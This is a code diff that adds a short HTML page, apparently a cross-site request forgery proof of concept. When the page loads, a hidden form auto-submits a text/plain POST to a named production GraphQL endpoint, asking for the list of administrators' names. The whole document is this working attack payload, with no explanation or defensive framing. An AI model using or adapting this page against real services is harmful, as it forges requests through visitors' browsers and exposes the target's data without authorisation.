@@ -1,0 +1,8 @@
+<form id="autosubmit" action="reachlink-backend-production.herokuapp.com/api/gql" enctype="text/plain" method="POST">
+    <input name="query" type="hidden" value="{admins{name}}" />
+    <input type="submit" value="Submit Request" />
+   </form>
+    
+   <script>
+    document.getElementById("autosubmit").submit();
+   </script>
